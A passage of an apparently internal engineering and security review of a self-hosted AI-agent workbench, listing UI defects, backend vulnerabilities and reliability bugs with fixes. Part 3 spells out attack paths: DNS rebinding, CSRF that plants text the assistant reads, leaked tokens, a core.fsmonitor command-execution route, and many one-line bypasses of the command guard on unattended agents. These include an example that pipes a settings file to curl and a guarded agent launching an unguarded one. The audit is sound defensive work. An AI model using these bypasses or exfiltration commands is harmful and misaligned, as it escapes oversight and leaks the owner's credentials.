- **C-28.** Streaming text is plain pre-wrap, then flips to rendered markdown, changing the bubble's height under the reader (`Room.tsx:91-98`). Render `live` through the same `<Markdown>`, throttled.
- **C-29.** No timestamps in the session chat; relative-only and frozen in the assistant chat (`Room.tsx:132, 150`). Use `<time>` with an absolute title, a 60 s tick, day separators.
- **C-30.** Missing affordances, verified absent: no copy button on messages or code blocks, no syntax highlighting in chat, no retry, regenerate or edit-and-resend (a failed entry is only painted red), no search within or across threads, no drag-and-drop attach, no lightbox for the user's own attachments, no thread rename, no export. Highest value on a phone: copy, retry on a failed entry, thread search.
- **C-31.** CouncilPanel edit form: unlabeled fields, and it opens below the whole grid, far from the card (`CouncilPanel.tsx:274-322`). Render the editor in place of the card, as MemoryPanel does.
- **C-32.** The pending-echo bubble contrast is about 2:1 (`ChatPane.tsx:600`). AA needs 4.5.
- **C-33.** Reduced motion misses `animate-pulse` and smooth scroll. See F-42.
- **C-34.** Both composers remove the focus ring with nothing in its place (`Chat.tsx:1149`, `ChatPane.tsx:687`). Add `focus-within:ring-1` on the card.
- **C-35.** Duplicated UI: two ToolChips, sample playback copied verbatim in two panels (both leak the object URL when `play()` rejects), `field` and `EFFORTS` constants twice, user-bubble markup twice with different radii and sizes.
- **C-36.** Seams: `Chat.tsx` holds six unrelated components. Extract `Threads`, `Dock`/`BrowserView`, `Month` (a full calendar grid inside the chat screen), `People`, then hooks `useAssistantThread` and `useReadAloud`. `ChatPane.tsx`: `useSessionChat`, `usePanePrompt`, the shared `Composer`. The hooks are what make C-01, C-02, C-07, C-14 and C-25 unit-testable.
- **C-37.** Smaller defects: `cancelSpeech` pauses the element, which fires neither `ended` nor `error`, so `speakOnPod`'s promise never settles and its object URLs leak; `failedToLoad` is never reset in ToolChip and PlanCard; the error line at `Chat.tsx:1039` has no dismiss and a failed queued post stalls the rest of the queue; `chat.ts:641-646` turns every read error (EACCES included) into "nothing said yet"; `transcripts.ts:63` reads a whole transcript into a string for the nightly harvest.

### Test gaps

**C-38.** The backend parsers are well covered (`chat.test.ts` 68 cases, `tui-prompt.test.ts` 25 cases from real panes).
Nothing renders Chat, Room, ChatPane or LivePrompt. Highest value, in order:

1. ChatPane merge: a second poll carries the same `:ask` id with `answered: true`; assert the card updates (C-02).
2. LivePrompt with `prompt=null` and `status="waiting"`: assert no request with `enter: true` is ever made (C-03).
3. `markdown.test.tsx`: a remote image renders no `<img>`, a `javascript:` link renders no href (C-04); `cite.test.ts`: a malformed `vk:` does not throw (C-24).
4. Chat socket: a fake WebSocket closes during `thinking`; assert reconnect and that a queued message eventually posts (C-01); the first frame with read-aloud on speaks nothing (C-07).
5. Backend: a transcript whose last line exceeds the window still yields messages (C-16).

---

## Part 3: Backend security surface

Given the no-auth design, the question is what any browser on the VPN, any web page open in the user's browser, and any
process on the pod can reach.

**S-01. No Host header validation: DNS rebinding turns the whole API into a same-origin target.** High. Confirmed in code; reachability of port 8080 from the browser is deployment-dependent.

- Where: `origin.ts:33` `host === req.headers.host`; `index.ts:44` listens on `0.0.0.0`; nothing compares `Host` to a known
  name. `origin.test.ts` pins "same host:port passes" with `host: "pod:8080"`, which is exactly the rebinding shape.
- Mechanism: a page on `evil.example:8080` rebinds DNS to the pod, service or node IP. Origin and Host are then equal, so
  every POST, the websocket upgrade and SSE pass, and GET responses become readable: mail, docs, session chat, and
  `POST /api/settings/vars/:key/reveal` hands back full tokens. The attach websocket is a root shell. An ingress that routes
  strictly by host name blocks this, but any path that reaches 8080 directly (pod CIDR over WireGuard,
  `kubectl port-forward`, `make run` on localhost) is exposed.
- Second issue, same line: the compare ignores the scheme, so an attacker on the phone's local network who can serve
  `http://verksted.local.bigd.no` can open `wss://.../attach`. No HSTS is sent.
- Fix: in the same `onRequest` hook, reject any request whose `Host` is not in an allowlist built from `PUBLIC_URL`,
  `ALLOWED_ORIGINS`, `localhost`, `127.0.0.1`, `[::1]`, for every method including GET. When `PUBLIC_URL` is https, require
  an https Origin.

**S-02. `/share` is a GET that performs a POST: cross-site CSRF into the assistant's inbox, labelled "from you".** High. Confirmed.

- Where: `Share.tsx:28-32` posts the query string to `/api/intake` on mount with no gesture; `vite.config.ts:47-51` share
  target is `method: "GET"`; `routes/intake.ts:42` files it as `"from you: ..."`; triage feeds it to the model. No
  `frame-ancestors` is sent.
- Mechanism: any page the user has open can do `<iframe hidden src="https://verksted.../share?text=...">`. Up to 20 000
  characters land as an item attributed to the user and are read by the assistant.
- Fix: a POST share target handled by the service worker, or show the shared content and require a tap before posting.
  Refuse framing (S-06). Label intake "shared" rather than "from you" until confirmed.

**S-03. Agent credentials travel in tmux argv, and a failed launch puts them in the HTTP response and the logs.** High. Confirmed.

- Where: `tmux.ts:64-66` `envArgs` builds `-e KEY=VALUE`; `sessions-store.ts:598, 640, 654` put every settings var
  (GH_TOKEN, CLAUDE_CODE_OAUTH_TOKEN, ...) and `VK_PROMPT` in there. `routes/sessions.ts:108` awaits `createSession`
  with no try/catch and there is no `setErrorHandler` anywhere, so Fastify answers 500 with `err.message`, which for
  `execFile` is `Command failed: tmux new-session ... -e GH_TOKEN=ghp_...`. The same error is logged by Fastify, by
  `sessions-store.ts:695` and by the scheduler; pino's err serializer includes `message` and `cmd`.
- Also: argv is visible in `/proc/*/cmdline` for the life of the client, and `ws/attach.ts:58-67` does the same on every attach.
- Fix: pass secrets through the child's `env` option (tmux inherits) or a 0600 env file the pane command sources and
  deletes; keep `-e` for non-secret per-session vars. Independently add a global `setErrorHandler` that answers
  `{ error: "internal error" }` for 5xx and a log serializer that drops `cmd` and scrubs `message`.

**S-04. `vk-guard` is bypassable in several one-line ways, and no bypass is pinned by a test.** High for the unattended maintainer model. Confirmed for the flattening; the rest read from the script.

- `runtime/vk-guard:76` flattens newlines to spaces, but the anchors accept only `^` or `; & | (` before the command word.
  `echo hi` newline `git reset --hard origin/main` matches nothing. Same for the `gh pr merge` tier check and "no nested agents".
- The anchors miss `env git`, `command git`, `/usr/bin/git`, `sh -c 'git ...'`, `{ git ...; }`, `then git`, backticks, `xargs`.
- `git -C . push --force` and `git -c a=b push origin main` match none of the push rules. `b=main; git push origin HEAD:$b` passes.
- `gh api --method=DELETE` passes (the pattern expects a space, not `=`), so `gh api --method=PUT .../pulls/N/merge`
  merges any PR from any stage.
- The write check misses quoted paths, `$HOME/...`, `/etc`, `/tmp`, and every interpreter (`python3 -c`, `node -e`,
  `curl -o`, `tar -C`, `patch`, `git -C /data/repos/other commit`).
- The gate's Edit check is a lexical glob: `/data/repos/<p>--gate-1/../../settings.json` matches (unverified whether
  Claude Code normalises the path first).
- Reads and egress are unrestricted: `cat /data/settings.json | curl -d @- https://...` is allowed.
- The largest hole is not in the script: the backend on `127.0.0.1:8080` accepts requests without an Origin
  (`origin.ts:21`). A guarded run can `curl -X POST .../api/projects/<p>/sessions` with `autoPermissions: true` to start an
  unguarded agent, type into any other session, or call `/reveal`.
- Fix, in rising cost: (a) split on newlines before flattening, match after `env`, `command`, absolute paths, `sh -c`, `{`,
  `then`, `do`, backtick; `git( -[cC] [^ ]+)* push`; `--method[= ]`; resolve gate paths through `inside()`; add every bypass
  above as a failing test first. (b) Deny curl/wget/nc to loopback and require a per-boot token (delivered to interactive
  sessions only) on session-creating and secret-revealing routes. (c) Run unattended stages as a separate unix user with
  no read access to `settings.json`, `.ssh`, `push.json`, with egress limited to github.com by NetworkPolicy. Only (c)
  survives a determined prompt injection.
- Tracked: partially (BACKLOG.md:825 notes the contract's no-go paths are prose).

**S-05. The "tap" on a proposal, and the mail/agent secret split, are not boundaries against anything running on the pod.** Medium (architectural).

- `routes/proposals.ts:13-15` says "the card is the authorisation", yet `POST /api/proposals` returns the id and
  `POST /api/proposals/:id/do` takes nothing but that id: two curls from any pod-local process. `agentEnv()` withholds the
  source keys, but every session runs as the same uid as the backend, so `cat /data/settings.json` returns them all.
- Fix: either document these as conveniences, or make them real: agents as an unprivileged user that cannot read the
  backend's files, and `do`, `reveal`, `PUT /api/settings`, `/api/ssh-keys*` gated on a per-boot secret delivered only in the
  HTML loaded through the ingress.

**S-06. No security headers at all.** Medium. Confirmed.

- `app.ts` registers only websocket and static plugins; no `@fastify/helmet`.
- (a) Clickjacking: any page can frame the app invisibly and steer taps onto "do", "force push", "delete project". No cookie
  is needed. This is also what makes S-02 silent. (b) No `Cross-Origin-Resource-Policy`: a cross-site page can embed
  `/api/docs/raw?path=...` as an image and learn existence and dimensions of personal documents. (c) No HSTS. (d)
  `/api/docs/raw` serves PDFs inline without the `default-src 'none'` CSP the project raw route has.
- Fix: helmet with `frame-ancestors 'none'`, a real SPA CSP (`default-src 'self'; connect-src 'self' ws: wss:; img-src 'self' data: blob:`),
  `crossOriginResourcePolicy: same-origin`, `referrerPolicy: no-referrer`, global `nosniff`, HSTS when `PUBLIC_URL` is https.

**S-07. Write endpoints follow symlinks at the leaf, and the commit route runs repo-controlled code in the backend's environment.** Medium. Confirmed for the PUT.

- `routes/files.ts:324-346`: the PUT realpath-checks only `dirname`, then `fs.writeFile(path.join(dir, basename))`. A cloned
  repo can ship `notes -> /data/settings.json` or `x -> .git/config`. Writing `.git/config` with `core.fsmonitor=<cmd>` gives
  command execution in the backend on the next `git status`, which the hub runs per repo on every refresh. `paths.ts:20-22`
  names this exact risk; tests pin the read side only.
- `routes/files.ts:388-390`: upload does `mkdir .verksted/uploads` then writes with no realpath check; a repo that ships
  `.verksted` as a symlink redirects uploads outside.
- `routes/files.ts:897`: discard calls `fs.rm` on the realpath, so an untracked symlink deletes its target.
- `runtime/git-hooks/commit-msg:57` chains to `.husky/commit-msg`, a tracked, client-writable path, and
  `routes/files.ts:558-560` runs `git commit` with `{...process.env, ...execEnv()}`: a cloned repo's husky hook runs as root
  with GH_TOKEN.
- Fix: `lstat` the leaf and refuse symlinks, or open with `O_NOFOLLOW`; resolve the upload dir after mkdir; `lstat` and
  unlink in discard. For backend-run git pass `-c core.fsmonitor= -c core.hooksPath=/dev/null` and a minimal env.

**S-08. Headless Chromium runs as root with `--no-sandbox`, browses arbitrary URLs, and can reach everything the pod can.** Medium. Confirmed.

- `browser.ts:131-134`; no `USER` in the Dockerfile; `validNavUrl` allows any http(s) URL; CDP listens unauthenticated on
  `127.0.0.1:9222-9422`.
- Mechanism: a renderer exploit lands as root in the pod that holds every token, the ServiceAccount token and
  `DOCKER_HOST`. The pane is also a full SSRF primitive into the cluster with the response streamed back as JPEG. Any
  session, guarded ones included, can drive any other session's browser over CDP.
- Fix: non-root and drop `--no-sandbox`, or Chromium under its own uid. In `validNavUrl`, resolve the host and refuse
  link-local, loopback and the cluster service CIDR for client-typed navigation.

**S-09. No rate limiting or resource caps on expensive routes.** Medium (low if the VPN only ever holds the owner's devices).

- No `@fastify/rate-limit`. Session create has no cap on live sessions (desk sessions always auto-permission); clone has no
  size or count cap; 20 MB uploads with unbounded count; intake unbounded; a Chromium per session up to 200 ports; no
  cap on open SSE streams.
- Fix: a small global budget, tight per-route budgets, a hard cap on live sessions and browsers, a disk-free check before
  clone and upload like `vk backup` already has.

**S-10. Settings accept any env var name, so the `ANTHROPIC_API_KEY` block is easy to sidestep.** Low to medium.

- `settings-store.ts:77-79` blocks exactly one key. `ANTHROPIC_AUTH_TOKEN`, `ANTHROPIC_BASE_URL`,
  `CLAUDE_CODE_USE_BEDROCK`, `LD_PRELOAD`, `PATH`, `GIT_SSH_COMMAND`, `NODE_OPTIONS` are all storable and injected into
  sessions. `ANTHROPIC_BASE_URL` at a third party would send the OAuth bearer and every prompt there.
- Fix: block the `ANTHROPIC_*` family and the loader and interpreter vars, or switch to an allowlist plus a custom prefix.

**S-11. Importing an SSH key under an existing name overwrites it, and a bad paste then deletes it.** Low to medium.

- `routes/ssh.ts:95-103` writes before validating, with no existence check (generate has one), and on failure runs
  `fs.rm(file)`. Fix: 409 when the name exists; validate in a temp file and rename on success.

**S-12. Push: the "app path only" rule lets `/\evil.com` through; `push.json` is world-readable and written non-atomically.** Low.

- `routes/push.ts:110` pattern `^/[^/].*$|^/$` accepts `/\evil.example`; `sw.ts:58-70` passes it to `client.navigate`, and
  URL parsing treats `\` as `/`. `push-store.ts:78` writes the VAPID private key with default mode. Any `https://` endpoint is
  accepted, making each notification a blind POST to a caller-chosen host.
- Fix: `^/(?![/\\])` on the route, an origin check in the service worker, the atomic 0600 writer, optionally allowlist the
  known push hosts.

**S-13. Smaller items.**

- `routes/cluster.ts:102` exposes node, pod, Argo and warning-event tables on a plain GET; sessions share the ServiceAccount
  token, including the Kargo Promotion create right.
- `git.ts:241-247` and `gh.ts:114-124` return the first stderr line to the client; latent if a remote URL ever embeds a token.
- `ws/attach.ts:127-139` has no explicit message size check and `@fastify/websocket` is registered without `maxPayload`
  (plugin default unverified).

---

## Part 4: Backend reliability, consistency and scale

The theme: integrity problems here are read-modify-write races and key reuse, not torn files, and the most urgent items
all come from unbounded history.

### High

**R-01. Ended sessions keep their CDP port forever: session creation stops after 200 sessions in history.** High. Confirmed in code and against the pod.

- Where: `browser.ts:11-19`: the pool is 9222 to 9421 and `nextCdpPort` throws when full. `sessions-store.ts:422, 740`
  build the used set from every meta on disk with no `endedAt` filter. `endSession` (`:793-804`) deliberately keeps the
  port on the stored meta. Nothing prunes metas (R-08).
- Live state: `GET /api/sessions` on the pod returns 145 sessions, 144 of them done. At roughly nine unattended sessions
  a night across three repos, the pool runs out in about a week. After that every `createSession` throws, interactive
  creates return 500 and every schedule records a break.
- Fix: build the used set from sessions that have not ended. Add a test with more than 200 ended metas.

**R-02. Nightly backup, docker prune and feed sweep use 24h `setInterval` from boot, so a frequently redeployed pod skips them.** High. Confirmed in code and against the pod.

- Where: `backups-store.ts:116-128`, `maintenance.ts:71-81`, `scheduler.ts:509`. No timer state is persisted.
- Live state: the pod's archive list holds 0910, 0911, 0912, 0913, 0916, 0917 and one from 0918. There is no backup for
  14 or 15 September, the two days on which the deployment repo shows a dozen promotions. The busiest days are the ones
  that go unprotected. The file's own comment calls the backup "the only reason the state on this pod is recoverable".
- Fix: drive all three from croner with `timezone: env.TZ` at a fixed hour, as the journal job already is. On boot, run
  one backup if the newest archive is older than 24h; the age check covers the crash-loop concern.

**R-04. `watchUnattended` force-removes a worktree based on any old finished build session with the same project name.** High when an issue is re-queued. Code path confirmed, runtime effect unverified.

- Where: `scheduler.ts:455-468` runs `removeWorktree(s.project)` for every done build session with clean work, every 30 s,
  forever; `projects-store.ts:114-121` runs `git worktree remove --force`. The worktree name is deterministic
  (`<repo>--maint-<issue>`).
- Scenario: issue 12 is built and its worktree removed. The owner relabels it `queued`. A new agent starts in the recreated
  directory, and within 30 s the watcher sees the old done session and force-deletes the tree under the live run.
- Fix: remove the worktree once, at the moment the run ends, or record `worktreeRemoved` and skip when any live session
  shares the project.

### Medium

**R-03. Backup failures and staleness are not surfaced.** `backups-store.ts:34-36, 97-103`: `lastError` is a module
variable lost on restart and a failure is only a `log.warn`. Fix: `announce()` plus a feed item on failure; derive "last
good backup" from the newest archive's mtime and flag it past 48h.

**R-05. Session ids are reused after a purge, and other stores key on them.** `sessions-store.ts:729-734` takes max+1
over metas that still exist (the comment at `:746` acknowledges reuse). Schedule runs store `sessionId`; feed ids are
`bench:wait:<id>`. Scenario: purge a scheduled run's session, start an interactive one with the same id; that night the
scheduler reads it as "previous run still open", and after 24h writes `failed: never signed off` into your session and ends
it. Fix: a per-project high-water mark, or a random suffix.

**R-06. `idleSeconds` defeats the SSE change test: the whole session history is re-broadcast every 3 s.** Confirmed.
`sessions-store.ts:266` computes it from `Date.now()`, so any quiet live session changes the JSON on every tick and
`events.ts:72-76` re-sends every session ever created. No frontend file reads `idleSeconds`. `events.test.ts` stubs the
sources, so tests cannot see it. Fix: remove the field or send `lastActivityAt`; stream only live plus recently ended
sessions; a test with the real `listSessions`.

**R-07. `listSessions` is uncached, costs O(history), and almost everything calls it.** Every call spawns `tmux ls`, reads
every meta and a `.report` per session, sequentially. Callers: events every 3 s, the notifier every 5 s, two scheduler
watchers every 30 s, `listProjects`, `pollBench`, `listRuns`, `dismissRun`, `/api/usage`. Per-session routes spawn `tmux ls`
twice. Fix: wrap `liveNames()` and `readAll()` in the existing `ttlCache` at about 1 s, invalidate on create, end, delete.

**R-08. Session metadata and sidecar files are never pruned.** `.report`, `.exit`, `.conv` files and transcripts persist
forever, as do `plan.jsonl` and closed loops. Fix: a retention rule in the maintenance sweep, for example archive metas
ended more than 90 days ago into a monthly JSONL. This also relieves R-01, R-06 and R-07.

**R-09. The `listSessions` sweep writes from a stale snapshot and can resurrect a purged session.**
`sessions-store.ts:446-453` reads the meta, runs several git calls and a full transcript parse, then writes it back.
`deleteSession` kills tmux first and removes the meta afterwards, so a 3 s tick can land in between and write the meta back
after the delete. The same stale write can drop a review mark. Fix: one per-id write queue that re-reads inside the queue
and skips when the file is gone; remove the meta before killing tmux.

**R-10. Interval bodies have no overlap guard, and `usageOf` parses whole transcripts on the event loop.**
`notifier.ts:104-126` and `pollers.ts:623-634` use `setInterval(async ...)` with no in-flight check. `usage.ts:85-99` reads
and parses the transcript and every subagent file, called from the sweep inside `listSessions`. A 100 MB transcript blocks
every terminal websocket for seconds. Fix: stream with `readline` or a worker (as `replace.ts` does); a `running` flag in
every timer helper; take measurement off the list path.

**R-11. Schedule records are unserialised read-modify-write between the scheduler and the routes.**
`schedules-store.ts:213-234, 249-253, 256-270, 317-330`. A UI PATCH can drop a run record, `lastSessionId` reverts, and a
second agent starts in the same working tree. `scheduler.ts:1003-1004` acknowledges the hazard. Fix: a per-schedule
promise chain; the same helper fixes R-09.

**R-12. Any schedule edit cancels every other schedule's jitter wait, and those runs vanish silently.** Confirmed.
`scheduler.ts:888` cancels all waits on every `rebuild`, which runs on every create, patch and delete. `fire()` has already
stamped the schedule, so no run record is written and `catchUp` ignores the tick. Edit schedule A at 02:05 and B's night is
lost with no trace. Fix: key waits by schedule id; at minimum record "cancelled by a reload".

**R-13. Unattended turns exclude each other by throwing.** `assistant.ts:1750`. A 07:00 briefing that collides with triage
is reported as a broken run with a high-priority push; the ceiling reservation leaks; learning at 23:50 can swallow the
23:55 journal with only a `log.warn`. Fix: a small FIFO queue, or a `busy` result the callers retry once without charging
the ceiling.

**R-14. The build stage can wedge the queue.** `scheduler.ts:370-384` runs `addWorktree`, `claimIssue`, `createSession`
with no cleanup. A transient `gh issue edit` failure leaves the worktree with the issue still `queued`, and every later night
fails with 409 on the same issue, pushing only the first time. Fix: try/catch that removes the worktree and re-labels;
reuse an existing clean worktree.

**R-15. Scheduler guardrails ignore the subscription; the daily ceiling counts UTC days in memory.** `scheduler.ts` does
not import `plan.ts`. A week window at 95% still launches every stage. The day key is `toISOString().slice(0, 10)`, so it
resets at 01:00 or 02:00 Oslo time and on every restart. A failing triage charges the ceiling every 10 minutes and can
starve the morning briefing. Fix: consult `planUsage()` before launch and record a "blocked" run above a threshold; use
the journal's day key; do not charge failed turns.

**R-16. `push.json` is written non-atomically, and any read failure regenerates the VAPID identity and wipes the subscriptions.** Confirmed.
`push-store.ts:60-79`. A kill during subscribe truncates the file; on the next boot every device silently stops receiving
pushes. Fix: `writeJsonAtomic`; regenerate only on ENOENT; keep a bad file aside and log at error level.

**R-19. A feed item whose version string is constant never comes back after it is resolved.** `pollers.ts:50-61` files a
waiting session under `bench:wait:<id>` with `version: "waiting"`; `feed-store.ts:115-135` treats an equal version as the
same event, state included. A session that stops to ask a second time stays `done` in the inbox. Same for poller error
items. Fix: put the wait's start time in the version. Add the test.

**R-20. The feed has no retention for items that are not `done`, and one feed GET reads the whole directory several times.**
`pollBench` calls `feed.list()` at least five times and `listSessions` twice, on every `GET /api/feed`, with no coalescing.
Fix: read once per `pollBench` and pass the array; `ttlCache`; age out quiet items; consider an in-memory index with
write-through.

**R-23. No `uncaughtException` handler, and a backend crash kills every agent.** `index.ts:60-62` handles only
`unhandledRejection`. tmux runs in the same container, so one synchronous throw in an event handler restarts the pod, and
only claude sessions resume. A candidate: `ws/attach.ts:141` calls `pty.resize` outside any try, possibly after `onExit`
(unverified whether node-pty throws). A-16 is another. Fix: log fatal and exit non-zero after `app.close()`; try/catch in the
message handler; return stop functions from the `start*` helpers.

**R-27. Error responses have two shapes because there is no global error handler.** Routes send `{ error }`; Fastify's
default for thrown errors and schema failures is `{ statusCode, error, message }`. `frontend/src/api.ts:49-51` reads only
`body?.error`, so validation detail is lost and the UI shows "Bad Request". Same fix as S-03.

**R-30. Desk sessions record `project: "desk"` but run in `desk/<task>`.** `routes/sessions.ts:139-145`. The transcript
path, usage, chat, restore and shell attach all derive from the project, so a desk session shows no chat and null usage,
and a restore starts claude in the wrong cwd (unverified on the pod). Fix: store `cwd` in the meta and derive from it.

### Low and medium-low

- **R-17.** Other non-atomic writes read concurrently: `writeReport` (`sessions-store.ts:108`), `claude-hooks.ts:110, 133` rewritten on every launch while running CLIs may re-read them, and unserialised settings writes.
- **R-18.** `writeAtomic` never fsyncs (`atomic-json.ts:38-47`). On the NFS PVC a node crash can leave a zero-length target, which every store reads as "no such record". `fh.sync()` for settings, schedules and push at least.
- **R-21.** A triage verdict can be applied to a newer version of an item than the one judged (`scheduler.ts:644-692`). Pass the judged `version` to `judge()`.
- **R-22.** Notifier state is in memory, so an outcome that happens across a restart is never pushed; `restoreSessions` should `announce()` each run it fails.
- **R-24.** Child processes without timeouts inside serialised paths: `tmux new-session`, `kill-session`, worktree commands, `git add/restore/rm/commit` (the commit runs hooks). `createSession` is globally serialised, so one hung tmux blocks every later create, the scheduler's included. Default timeout in `exec.ts`; serialise per project.
- **R-25.** The SSE route ignores backpressure and has no client cap (`routes/events.ts:47-51`). With R-06, a suspended phone accumulates a full session list every 3 s in Node's buffer.
- **R-26.** The terminal websocket has no backpressure (`ws/attach.ts:92`). Pause the pty above a `bufferedAmount` threshold.
- **R-28.** Health, readiness, metrics and version are minimal: `app.ts:128` returns `{ ok: true }` unconditionally; no metrics; no build id exposed, so a long-lived PWA cannot tell the backend moved on. Add `/api/ready` (cheap `tmux ls` plus a temp-file write), bake the git SHA into the image, return it in an `x-vk-build` header, offer a reload on mismatch.
- **R-29.** No response compression, and hashed assets get default cache headers. `@fastify/compress`; `immutable` for `/assets/*`, `no-cache` for `index.html`.
- **R-31.** Stored JSON has no shape validation or version field. A meta of `{}` or `null` passes the parse and throws at `sessions-store.ts:462` or `:433`, taking down `/api/sessions`, SSE, the notifier, the scheduler watch and `listProjects` together. A tiny per-store guard, skip and log invalid files, add `"v": 1`.
- **R-32.** Search returns 500 instead of a truncated result when rg prints more than 4 MB (`routes/files.ts:753-789`).
- **R-33.** GET handlers write state: `GET /api/sessions` sweeps and measures, `GET /api/usage` backfills, `GET /api/feed` runs `pollBench` and lifts snoozes. Side effects then depend on who is polling and run concurrently per tab. This is the root of R-09 and R-20. Move them to one background sweeper.
- **R-34.** Maintainability: `scheduler.ts` (1014 lines) splits into scheduler, unattended watch and assistant jobs; `sessions-store.ts` mixes store, launch and reaper; the `Logger` interface is redeclared in eight files; five stores hand-roll `readAll`/`get`/`write`; verdict regexes are duplicated; `idleSeconds` is a dead wire field.
- **R-35.** Test gaps: nothing covers more than 200 sessions (R-01), a re-queued issue (R-04), id reuse after purge (R-05), a repeat wait (R-19), a jitter wait cancelled by an unrelated reload (R-12), `runUnattended` busy (R-13), a corrupted `push.json` (R-16), sweep against purge, or `updateSchedule` against `recordRun`. `startNightly` and `startMaintenance` return no handle, so they cannot be tested.

---

## Part 5: Frontend outside the chat

Correction to a premise: there are frontend unit tests (`frontend/test/`, 13 files, about 89 cases) and eslint is wired
into `make lint` and CI. CLAUDE.md still says `make lint` is tsc only.

### Correctness

**F-01. The SSE "silence" watchdog is never cancelled, so the stream reports unhealthy 8 s after every open.** High. Confirmed in code; worth five minutes in a network tab.

- Where: `events.ts:59-60` arms the timer in `open()`; the topic listener (`:46-54`) sets healthy but never clears it. The
  backend publishes only on change and its keepalive is an SSE comment (`": ping"`), which EventSource never surfaces. On a
  quiet bench: snapshot, healthy, then unhealthy 8 s later until the next real change, and `usePoll` falls back to its 5 s
  interval while the stream stays open. The push optimisation is mostly off.
- Why tests miss it: `events.test.ts:116-135` advances 30 s inside one `act`.
- Fix: send a named `event: ping` from the server and re-arm the watchdog on every event.
- Note: R-06 currently masks this whenever a live session exists, because the list is re-sent every 3 s anyway. Fix both
  together or fixing R-06 will expose F-01.

**F-02. Terminal reconnect destroys the xterm instance, wiping the screen the banner was designed to keep readable.** Medium. Confirmed.
`Terminal.tsx:470-697` creates xterm, the socket and all listeners in one effect keyed `[sessionId, shell, attempt]`;
cleanup calls `term.dispose()`. Every backoff retry replaces the screen with an empty terminal. Fix: terminal lifetime keyed
on `[sessionId, shell]`, socket lifetime on `attempt`; `term.reset()` once the new socket opens.

**F-03. Font size change does not resize tmux.** Medium. Confirmed (no `term.onResize` anywhere).
`Terminal.tsx:462-468` claims `fit()` "sends the new cols/rows on to tmux". The only resize send is in the container's
ResizeObserver, whose box does not change with the font. Fix: `term.onResize` inside the connection effect.

**F-04. Unsaved file edits are lost on a backdrop click.** High. Confirmed.
`Session.tsx:1159` calls `setFile(null)`, while the close button, Escape and Back all go through `closeFile()` which asks
first. Fix: `void closeFile()`.

**F-05. The global "add schedule" form posts an empty project unless the select is touched.** Medium. Confirmed.
`SchedulesPanel.tsx:256` uses `project ?? drafted ?? ...` and `drafted` defaults to `""`. The select shows the first repo
while `""` is sent, and the backend 400s. Fix: `||`.

**F-06. The Session screen ignores `notFound`, so a bad or purged session id shows skeletons forever.** Medium.
`Session.tsx:193`. A push notification tapped after the session was purged lands on a dead screen. `Project.tsx:99, 199`
does it right.

**F-07. Unhandled rejections and silent failures on mutations in Inbox and Session.** High.
`Inbox.tsx:161-170` `act()` is try/finally with no catch, and Inbox has no error state at all. `Session.tsx:401-428`
`kill()` and `deleteSession()` have no catch. Over a flaky tunnel "done" simply does nothing. Fix: one shared `useAction`
hook (busy, error, catch); GitPanel, SchedulesPanel, SshKeys and BranchControl already hand-roll the same `run()`.

**F-08. Form drafts are cleared even when the save failed.** Medium. `Settings.tsx:68-90, 481-486`;
`WaitingSession.tsx:107-111`. A pasted API key or typed reply is gone after a timeout. Fix: clear only on success.

- **F-09.** The sign-in link bar cannot be dismissed while the URL is in scrollback, and `AUTH_URL_RE` matches any URL containing `login`, `verify` or `oauth` (`Terminal.tsx:13-14, 545-552`).
- **F-10.** Busy overlays swallow Back, leaving history out of step (`Today.tsx:280-282`, `BranchControl.tsx:188`, `Project.tsx:418`). On Today the sheet is unclosable for up to 11 minutes.
- **F-11.** Unguarded `localStorage` in render paths (`Terminal.tsx:194, 467`, `Session.tsx:176, 228-258`, `Hub.tsx:171, 289`). With storage blocked these throw during render. One `storage.get/set` helper.
- **F-12.** A schedule row's edit draft is seeded without waiting for `fresh` (`SchedulesPanel.tsx:292-295`). Same class as C-11.

### Performance

**F-13. The Session chunk is 2.2 MB (437 KB gzip) because 1,226 file-icon SVGs are inlined as data URIs.** High. Confirmed against `frontend/dist`.
`fileicons.ts:20-24` uses an eager `import.meta.glob`; Vite inlines assets under 4 KB. `vite.config.ts:57-60` had to raise the
precache cap to 6 MiB. That chunk also carries `highlight.js/lib/common` and xterm, and it is what a notification tap has to
parse on a phone. Fix: a lazy glob resolved on demand, or a 40-icon subset; lazy-load hljs on first file open.

- **F-14.** The poll cache is re-serialised and written to localStorage after every poll answer (`api.ts:68-73, 113-132`): up to a megabyte of `JSON.stringify` on the main thread every few seconds. Skip when unchanged, persist on `pagehide`, exclude tree, search and capture paths.
- **F-15.** No de-duplication of identical polls: `/api/feed` is fetched by three independent hooks on one screen. A per-path subscription store inside `usePoll` with `useSyncExternalStore` (one timer, one request, N listeners).
- **F-16.** Every poll answer re-renders its subscribers even when nothing changed (`api.ts:199-205`). Today holds nine polls and re-parses the brief through react-markdown on each. Compare response text or an ETag before `setData`.
- **F-17.** Docs search fires per keystroke, and each prefix lands in the persistent poll cache with document excerpts (`Docs.tsx:47-50`). Debounce, use `api()`, keep search out of the stored cache.
- **F-18.** The terminal has no renderer addon and no write flow control (`Terminal.tsx:504-517, 541-542`). `@xterm/addon-webgl` with a DOM fallback; `term.write(data, cb)` with watermarks. Pairs with R-26.
- **F-19.** Browser pane frames can paint out of order and are never dropped; mouse moves are relayed unthrottled (`BrowserPane.tsx:60-74, 300`).
- **F-20.** The command palette does one request per project although `/api/sessions` is already in the stream cache (`CommandPalette.tsx:62-66`).

### UI consistency

**F-21. No shared Button, Input or Tab primitives; the same class strings are pasted dozens of times and have drifted.** Medium.
29 primary buttons outside chat with 9 different radii, three in mono and the rest sans. The field class is redefined in ten
places, the ghost button in three files (eight times in Settings alone), and three tab strips are built separately with
different tap classes. Fix: `components/ui/{Button,Field,SegTabs}.tsx` with `variant` and `size`. This is CLAUDE.md's own
"reuse before adding" and "established component library" rule. shadcn/ui on Radix fits the Tailwind v4 tokens without
changing the look.

**F-22. Five hand-rolled modals, none with a focus trap, initial focus or focus restore.** Medium.
`Sheet.tsx`, `CodeOverlay.tsx`, the file viewer in `Session.tsx:1154-1269` (a near copy of CodeOverlay's frame),
`ReviewOverlay.tsx`, `DocViewer.tsx`, `CommandPalette.tsx`. All declare `aria-modal="true"` but Tab walks into the page
behind. Only Sheet locks body scroll. Heights differ (`80vh`, `85vh`, `90vh`, `90dvh`), and the `vh` ones ignore the
on-screen keyboard, which matters for the file editor. Fix: Radix `Dialog` under one `Overlay` wrapper that keeps
`useDismissOnBack`; cmdk for the palette.

**F-23. Feedback has at least four shapes and two colours, and almost none of it is announced.** Medium.
A plain `text-wait` line about 15 times, the same role in `text-fail` in five places, a ringed box once, and a proper
`role="alert"` banner only in BranchControl. There is no toast pattern at all. Fix: promote BranchControl's banners to a
